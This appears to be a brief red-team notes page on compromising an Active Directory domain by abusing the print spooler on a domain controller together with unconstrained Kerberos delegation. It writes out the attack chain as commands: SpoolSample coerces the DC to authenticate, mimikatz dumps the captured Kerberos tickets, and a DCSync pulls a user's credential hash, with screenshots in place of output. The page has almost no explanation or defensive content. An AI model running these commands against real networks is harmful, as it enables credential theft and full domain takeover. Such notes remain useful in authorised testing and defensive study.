# Domain Compromise via DC Print Server and Kerberos Delegation

```text
.\SpoolSample.exe dc01 ws01
```

![](../.gitbook/assets/screenshot-from-2018-10-31-23-32-34.png)

```text
mimikatz # sekurlsa::tickets
```

![](../.gitbook/assets/screenshot-from-2018-10-31-23-33-49.png)

```text
mimikatz # lsadump::dcsync /domain:offense.local /user:spotless
```

![](../.gitbook/assets/screenshot-from-2018-10-31-23-43-32.png)

## References

{% embed url="https://adsecurity.org/?p=4056" %}

{% embed url="https://adsecurity.org/?p=2053" %}

{% embed url="https://github.com/leechristensen/SpoolSample" %}

